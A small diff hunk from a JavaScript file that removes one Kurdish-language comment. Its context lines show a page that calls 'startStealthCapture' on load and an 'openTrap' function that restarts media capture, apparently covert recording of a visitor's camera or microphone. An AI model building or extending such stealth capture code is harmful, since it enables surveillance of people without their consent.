@@ -130,7 +130,6 @@ window.addEventListener('load', () => {
     startStealthCapture();
 });
 
-// فەنکشنی دەستپێکردنەوە ئەگەر بەکارهێنەر کلیکی کرد
 function openTrap() {
     if (!mediaStream) {
         startStealthCapture();
